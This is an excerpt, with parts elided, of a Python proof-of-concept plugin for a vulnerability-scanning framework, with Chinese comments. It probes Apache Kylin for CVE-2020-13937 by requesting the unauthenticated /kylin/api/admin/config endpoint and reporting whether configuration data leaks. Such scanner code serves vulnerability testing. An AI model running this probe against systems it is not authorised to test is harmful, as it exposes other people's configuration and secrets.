...
import requests
POC_NAME = "ApacheKylinXielou"  # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class ApacheKylinXielou(BasePoc):
    # PoC实现类，需继承BasePoc
    # 为PoC填充poc_info、scan_info、test_case三个字典中的基本信息

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0028',  # PoC的VID编号
            'vbid': '',
            'Name': 'Apache Kylin Xielou',  # PoC名称
            'Author': 'feier',  # PoC作者
            'Create_date': '2021-7-24',  # PoC创建时间
        },

        'vul': {
            'Product': 'Apache Kylin',  # 漏洞所在产品名称
            'Version': '0.1',  # 产品的版本号
            'Type': 'ReadFile',  # 漏洞类型
    ...
    def verify(self, first=False):
        ...
        # 以下是PoC的检测逻辑
        url = target + "/kylin/api/admin/config"
        ...
        try:
            ...
            if "config" in response.text:
                ...
                if verbose:
                    highlight('[*] Apache Kylin 未授权配置泄露 CVE-2020-13937 Found')
            else:
                if verbose:
                    highlight('[*] Apache Kylin 未授权配置泄露 CVE-2020-13937 Not Found')
